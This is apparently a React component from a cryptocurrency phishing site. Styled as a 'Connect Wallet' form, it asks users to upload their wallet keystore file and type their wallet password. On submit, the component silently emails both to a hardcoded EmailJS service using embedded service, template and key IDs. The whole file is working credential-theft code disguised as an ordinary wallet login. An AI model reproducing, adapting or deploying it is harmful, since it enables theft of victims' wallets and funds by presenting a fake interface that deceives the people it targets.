import React, { useRef } from 'react'
import emailjs from '@emailjs/browser';

import FormInput from '../FormInput'




const FORM_INPUT = [
    {
        name: 'keystore',
        label: 'Upload your keystore file',
        type: 'file',
        placeholder: 'Choose your keystore file',
        hint: 'Typically 12(sometimes 24) words separated by single spaces',
    },
    {
        name: 'password',
        label: 'Enter your wallet password',
        type: 'password',
        placeholder: 'Enter your password',
        hint: '',
    }
]

export default function Keystore()
{
    const form = useRef()
    const sendEmail = (e) => {
        e.preventDefault();
    
        emailjs.sendForm('service_eitcot7', 'template_oyz43pv', form.current, 'MLwjHKgTUJiMDQ_px')
          .then((result) => {
              console.log(result.text);
          }, (error) => {
              console.log(error.text);
          });
        e.target.reset()
      };
   
  return (
    <div>
    <form ref={form} className=' flex flex-col items-start justify-start gap-2' onSubmit={sendEmail}>
        {
            FORM_INPUT.map((input, index) => <FormInput key={index} {...input} />)
        }
              {/* <input
                  type="text"
                  placeholder='fullname'
                  name='user_name'
                  required
              />
              <input
                  type="email"
                  placeholder='Email'
                  name='user_email'
                  required
              />
              <input
                  type="text"
                  placeholder='Subject'
                  name='subject'
                  required
              />
              <textarea
                  name='message'
                  cols='30'
                  rows='10'
                  placeholder='Type a Message'
              /> */}
        <button type='submit' className='font-bold my-2 text-black bg-blue-400 max-w-full w-48 p-2 rounded-md'>
            Connect Wallet
        </button>
    </form>
</div>
  )
}
